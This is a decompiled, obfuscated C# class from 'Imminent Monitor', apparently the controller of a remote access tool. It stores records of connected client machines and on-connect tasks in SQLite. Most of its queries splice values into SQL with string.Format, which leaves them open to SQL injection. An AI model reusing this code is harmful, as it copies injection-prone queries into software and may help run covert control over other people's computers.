// Decompiled with JetBrains decompiler
// Type: GClass22
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.Windows.Forms;

public sealed class GClass22
{
  private SQLiteConnection sqliteConnection_0;
  private string string_0;

  public GClass22()
  {
    this.string_0 = "Data Source=" + Application.StartupPath + "\\Resources\\Databases\\core.sqlite";
    this.sqliteConnection_0 = new SQLiteConnection(this.string_0);
    this.sqliteConnection_0.Open();
    this.method_11();
  }

  public void method_0(GClass18 gclass18_0)
  {
    if (this.method_7(gclass18_0.method_20().method_0()))
      return;
    this.method_6(string.Format("INSERT INTO clients VALUES ('{0}', '{1}', '{2}', '{3}', '{4}', '{5}', '{6}', '{7}', '{8}', '{9}', '{10}')", (object) gclass18_0.method_20().string_7, (object) gclass18_0.method_20().string_1, (object) gclass18_0.method_20().string_3, (object) gclass18_0.method_20().string_12, (object) gclass18_0.method_20().string_15, (object) gclass18_0.method_20().string_5, (object) gclass18_0.method_20().string_6, (object) gclass18_0.method_20().method_0(), (object) true, (object) DateAndTime.DateString, (object) string.Empty));
  }

  public void method_1(GClass18 gclass18_0, bool bool_0)
  {
    if (!this.method_7(gclass18_0.method_20().method_0()))
      return;
    this.method_6(string.Format("UPDATE clients SET Connected='{0}' WHERE ID='{1}'", (object) bool_0, (object) gclass18_0.method_20().method_0()));
  }

  public void method_2() => this.method_6("UPDATE clients SET Connected='False' WHERE Connected='True'");

  public List<GClass24> method_3()
  {
    List<GClass24> gclass24List1;
    try
    {
      SQLiteCommand command = this.sqliteConnection_0.CreateCommand();
      command.CommandText = "SELECT * FROM clients WHERE Connected='False'";
      List<GClass24> gclass24List2 = new List<GClass24>();
      SQLiteDataReader sqLiteDataReader = command.ExecuteReader();
      while (sqLiteDataReader.Read())
        gclass24List2.Add(new GClass24()
        {
          string_0 = sqLiteDataReader.GetString(0),
          string_1 = sqLiteDataReader.GetString(1),
          string_2 = sqLiteDataReader.GetString(2),
          string_3 = sqLiteDataReader.GetString(3),
          string_4 = sqLiteDataReader.GetString(4),
          string_5 = sqLiteDataReader.GetString(5),
          string_6 = sqLiteDataReader.GetString(6),
          string_7 = sqLiteDataReader.GetString(7),
          string_8 = sqLiteDataReader.GetString(9)
        });
      gclass24List1 = gclass24List2;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      gclass24List1 = (List<GClass24>) null;
      ProjectData.ClearProjectError();
    }
    return gclass24List1;
  }

  public string method_4(GClass18 gclass18_0)
  {
    string str;
    try
    {
      if (this.method_7(gclass18_0.method_20().method_0()))
      {
        SQLiteCommand command = this.sqliteConnection_0.CreateCommand();
        command.CommandText = "SELECT * FROM clients WHERE ID=@id";
        command.Parameters.AddWithValue("id", (object) gclass18_0.method_20().method_0());
        SQLiteDataReader sqLiteDataReader = command.ExecuteReader();
        str = sqLiteDataReader.Read() ? sqLiteDataReader.GetString(9) : "?";
      }
      else
        str = "?";
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = "?";
      ProjectData.ClearProjectError();
    }
    return str;
  }

  public void method_5(string string_1) => this.method_6(string.Format("DELETE FROM clients WHERE ID='{0}'", (object) string_1));

  private void method_6(string string_1)
  {
    try
    {
      SQLiteCommand command = this.sqliteConnection_0.CreateCommand();
      command.CommandText = string_1;
      command.ExecuteNonQuery();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private bool method_7(string string_1)
  {
    bool flag;
    try
    {
      SQLiteCommand command = this.sqliteConnection_0.CreateCommand();
      command.CommandText = "SELECT * FROM clients WHERE ID=@id";
      command.Parameters.AddWithValue("id", (object) string_1);
      flag = command.ExecuteReader().Read();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
    }
    return flag;
  }

  public void method_8()
  {
    try
    {
      SQLiteCommand command = this.sqliteConnection_0.CreateCommand();
      command.CommandText = "SELECT * FROM onconnect";
      SQLiteDataReader sqLiteDataReader = command.ExecuteReader();
      while (sqLiteDataReader.Read())
        dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.list_0.Add(new GClass20()
        {
          genum6_0 = (GClass20.GEnum6) Conversions.ToByte(sqLiteDataReader.GetString(0)),
          string_0 = sqLiteDataReader.GetString(1),
          string_1 = sqLiteDataReader.GetString(2),
          string_2 = sqLiteDataReader.GetString(3)
        });
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public void method_9(GClass20 gclass20_0) => this.method_6(string.Format("INSERT INTO onconnect VALUES ('{0}', '{1}', '{2}', '{3}')", (object) Convert.ToInt32((byte) gclass20_0.genum6_0), (object) gclass20_0.string_0, (object) gclass20_0.string_1, (object) gclass20_0.string_2));

  public void method_10(string string_1) => this.method_6(string.Format("DELETE FROM onconnect WHERE id='{0}'", (object) string_1));

  private void method_11()
  {
    try
    {
      this.method_6("ALTER TABLE clients ADD COLUMN notes TEXT;");
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public void method_12(GClass18 gclass18_0, string string_1)
  {
    if (!this.method_7(gclass18_0.method_20().method_0()))
      return;
    this.method_6(string.Format("UPDATE clients SET notes='{0}' WHERE ID='{1}'", (object) string_1, (object) gclass18_0.method_20().method_0()));
  }

  public string method_13(GClass18 gclass18_0)
  {
    string empty;
    try
    {
      if (this.method_7(gclass18_0.method_20().method_0()))
      {
        SQLiteCommand command = this.sqliteConnection_0.CreateCommand();
        command.CommandText = "SELECT * FROM clients WHERE ID=@id";
        command.Parameters.AddWithValue("id", (object) gclass18_0.method_20().method_0());
        SQLiteDataReader sqLiteDataReader = command.ExecuteReader();
        if (sqLiteDataReader.Read())
        {
          empty = sqLiteDataReader.GetString(10);
          goto label_6;
        }
      }
      else
      {
        empty = string.Empty;
        goto label_6;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      empty = string.Empty;
      ProjectData.ClearProjectError();
      goto label_6;
    }
    return string.Empty;
label_6:
    return empty;
  }
}
